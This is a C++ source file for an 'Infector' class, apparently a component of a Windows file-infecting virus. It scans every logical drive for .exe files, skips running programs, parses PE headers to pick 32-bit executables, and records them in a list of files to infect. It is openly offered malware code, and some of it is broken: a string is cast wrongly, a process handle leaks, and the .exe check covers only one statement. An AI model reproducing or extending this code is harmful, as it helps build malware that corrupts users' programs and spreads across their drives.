#include "Infector.h"


bool Infector::file_exists(std::filesystem::path p)
{
    return (std::filesystem::exists(p)) ? true : false;
}


void Infector::read_file(std::filesystem::path p)
{
    if (!file_exists(p))
    {
        std::cout << "Cannot read file that does not exists!";
    }

    std::ifstream inf_file(p);
    std::string file_path = "";
    std::string delimiter = ",";
    int index_file = 0;
    std::string line = "";
    size_t pos = 0;


    if (inf_file.is_open())
    {
        while (std::getline(inf_file, line))
        {
            file_path = line.substr(0, line.find(delimiter));
            index_file = std::stoi(line.erase(0, line.find(delimiter) + delimiter.length()));
            infected_files.emplace_back(std::move(std::make_pair(file_path, index_file)));
        }
    }


    inf_file.close();


}

void Infector::write_file(std::filesystem::path p)
{
    std::fstream inf_file(p);
    if(!(inf_file.peek() == std::ifstream::traits_type::eof()))
    {
        inf_file.clear();
    }


    for (auto& f : infected_files)
    {
        inf_file << f.first << ',' << f.second << '\n';
    }



    inf_file.close();
}


std::filesystem::path Infector::get_path_by_index(int index)
{
    if (infected_files.empty())
    {
        read_file(path_to_file);
    }

    for (auto& f : infected_files)
    {
        if (f.second == index)
        {
            return (f.first);
            break;
        }
    }

}

std::string Infector::get_exe_name(const std::filesystem::path& p) const
{
    std::string exe_path = p.u8string();
    int index = 0;
    std::string exe_name = "";

    for (auto it = exe_path.begin(); it != exe_path.end(); ++it)
    {
        if (*it == '\\' || *it == '/')
        {
            index = static_cast<int>(it - exe_path.begin());
        }
    }
    index++;

    for (auto it = exe_path.begin() + index; it != exe_path.end(); ++it)
    {
        exe_name += *it;
    }

    return exe_name;
}


bool Infector::file_already_running(std::filesystem::path path)
{
    std::string exe_name = get_exe_name(path);


    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    //const char* process_name = "Project2.exe"
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    CString process_name = exe_name.c_str();

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (wcscmp(entry.szExeFile, process_name) == 0)
            {
                HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);

                return true;

                CloseHandle(hProcess);
            }
        }
    }

    CloseHandle(snapshot);
    return false;
}


void Infector::get_exes(std::vector<std::filesystem::path>& dir_paths, std::vector<std::pair<std::filesystem::path, int>>& exe_paths)
{
    std::filesystem::path path;
    std::filesystem::path p;

    int it = 0;
    do
    {
        path = dir_paths.back();
        dir_paths.pop_back();
        try
        {
            for (const auto& entry : std::filesystem::directory_iterator(path))
            {
                p = entry.path();
                if ((entry.is_regular_file()) && (p.extension() == ".exe"))
                    std::cout << entry.path() << std::endl;
                if (file_already_running(entry.path()) == false)
                {
                    PE::PE_file pe_file(entry.path());
                   
                    pe_file.map_file();
                    pe_file.parse_file();
                    

                    if (pe_file.check_32() == true)
                    {
                        exe_paths.emplace_back(std::move(std::make_pair(entry.path(), it)));
                        it++;
                    }
                    pe_file.freeFile();
                }
                if (exe_paths.size() == number_of_files)
                {
                    break;
                }

                if (entry.is_directory())
                {
                    dir_paths.emplace_back(entry.path());
                }
            }
        }
        catch (std::filesystem::filesystem_error e)
        {
            //std::cout << "fail";
            std::cout << e.what();
        }


    } while (!dir_paths.empty());
}



void Infector::files_to_infect()
{
	std::vector<std::filesystem::path> main_paths = {};
	//Navraci masku vsech pouzitych pismen pro oznaceni logickych disku
	DWORD drives = GetLogicalDrives();
	std::string drive_name = "";
	for (int i = 0; i < 26; i++)
	{
		if ((drives & (1 << i)))
		{
			TCHAR driveName[] = { TEXT('A') + i, TEXT(':'), TEXT('\\'), TEXT('\0') };
			drive_name = { char('A' + i) , char(':') , char('\\'), char("Program Files") };
			main_paths.emplace_back(drive_name);
		}
	}

    get_exes(main_paths, infected_files);



}